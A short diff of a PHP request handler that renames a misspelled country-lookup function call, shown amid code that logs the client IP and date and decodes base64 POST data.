@@ -11,7 +11,7 @@ $client = new Clients;
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     $ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
-    $country = getConteryCode($ipaddress);
+    $country = getCounteryCode($ipaddress);
     $date = date("Y-m-d");
     $post_data = $_POST['data'];
     $data = explode(DATA_SPLITTER, $utils->base64_decode_url($post_data));
